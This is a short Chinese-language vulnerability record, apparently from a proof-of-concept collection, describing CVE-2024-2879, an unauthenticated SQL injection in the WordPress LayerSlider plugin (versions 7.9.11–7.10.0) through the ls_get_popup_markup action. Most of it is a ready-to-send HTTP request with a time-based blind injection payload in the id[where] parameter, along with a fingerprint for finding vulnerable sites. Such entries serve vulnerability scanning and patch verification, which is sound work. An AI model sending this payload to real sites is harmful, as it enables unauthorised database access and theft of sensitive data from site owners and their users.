﻿# WordPress LayerSlider插件SQL注入漏洞

> 更新时间：2024-04-19

> 漏洞编号：CVE-2024-2879

> 漏洞说明：WordPress LayerSlider插件版本7.9.11 – 7.10.0中，由于对用户提供的参数转义不充分以及缺少wpdb::prepare()，可能导致通过 ls_get_popup_markup 操作受到SQL注入攻击，未经身份验证的威胁者可利用该漏洞从数据库中获取敏感信息。

> 漏洞特征：body="/wp-content/plugins/LayerSlider/"

> 验证脚本：HTTP

```
GET /wp-admin/admin-ajax.php?action=ls_get_popup_markup&id[where]=1)and+(SELECT+6416+FROM+(SELECT(SLEEP(5)))nEiK)--+vqlq HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：WordPress LayerSlider插件SQL注入漏洞.poc

